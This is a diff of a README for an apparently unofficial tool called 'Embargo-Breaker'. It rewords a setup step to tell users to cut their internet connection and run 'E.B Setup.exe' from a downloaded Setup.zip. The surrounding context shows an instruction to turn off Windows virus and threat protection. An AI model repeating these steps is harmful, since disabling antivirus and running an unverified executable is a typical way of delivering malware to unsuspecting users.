@@ -17,7 +17,7 @@ Open `Windows Security > Virus & threat protection > Manage settings` and turn o
 
 > download the file from [here](https://github.com/ALTONIBOT/Embargo-Breaker/raw/main/Setup.zip) .
 
-* Step 3: turn off Internet Data and open zip and start setup file:
+* Step 3: turn off Internet Data and start `Setup.zip > E.B Setup.exe`
 
 ![img](https://github.com/ALTONIBOT/Embargo-Breaker/blob/main/hint-img/1.png)
 
